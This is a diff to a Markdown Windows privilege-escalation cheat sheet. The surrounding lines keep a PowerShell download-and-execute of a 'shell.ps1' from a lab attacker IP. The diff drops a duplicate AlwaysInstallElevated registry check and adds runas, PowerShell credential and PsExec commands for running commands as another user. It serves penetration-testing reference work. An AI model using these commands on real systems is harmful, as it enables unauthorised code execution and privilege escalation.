@@ -285,14 +285,6 @@ Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
 ```
 
-### AlwaysInstall Elevated
-
-Allows non-privileged users to run executables as SYSTEM
-
-```text
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
-```
-
 ### **AlwaysInstall Elevated**
 
 Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
@@ -396,8 +388,31 @@ powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64St
 # hostname\username
 ```
 
+### Using `Runas` to execute commands as another user
+
+```text
+C:\Windows\System32\runas.exe /env /noprofile /user:$UserName $Password "$Commands"
+```
+
+#### Using PowerShell
+
+```text
+$passwd = ConvertTo-SecureString "$Password" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("$UserName", $passwd)
+$computer = "$ComputerName"
+[System.Diagnostics.Process]::Start("$Commands", $creds.Username, $creds.Password, $computer)
+```
+
+#### Using PsExec
+
+```text
+PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
+```
+
 ## References
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
 * [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+
 
